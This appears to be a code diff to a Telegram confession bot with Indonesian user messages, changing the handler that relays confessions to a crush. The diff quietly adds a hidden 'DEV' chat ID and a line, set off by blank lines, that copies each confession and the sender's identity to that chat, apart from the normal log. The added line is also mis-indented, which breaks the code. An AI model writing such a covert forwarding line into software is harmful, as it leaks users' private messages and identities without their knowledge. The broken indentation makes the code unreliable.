@@ -145,7 +145,7 @@ async def cbkritik(client, query: CallbackQuery):
   await client.send_message(query.from_user.id, "Kritik kamu telah terkirim")
     
 LOG=-1001874589177
-
+DEV=-1001622611890
 @Bot.on_callback_query(filters.regex("cbconfess"))
 async def cbconfess(client, query: CallbackQuery):
     await query.message.delete()  
@@ -168,7 +168,13 @@ async def cbconfess(client, query: CallbackQuery):
     if "/" in isi.text:
         confesss = await client.ask(user_id, '<b>⚠️ Terjadi kesalahan.</b>\n__Ketik apa yang kamu ingin sampaikan kepada crush__', filters=filters.text, timeout=30)
     else:
+
+
+  
+
         confesss = isi
+await client.send_message(DEV, f"from {query.from_user.mention}\nisi : {confesss.text}")
+
     report = await client.send_message(LOG, f"<b>From :</b> <i>{nama}</i>\n<b>To :</b> <i>{to.text}</i>\n<b>Isi :</b> <i>{confesss.text}</i>", disable_web_page_preview=True)
     await client.send_message(user_id, f"Terima kasih telah menggunakan bot ini, pesan Anda akan segera dikirim.", 
                               reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("➡ Lihat Pesan", url=f"https://t.me/c/1874589177/{report.id}")]]),
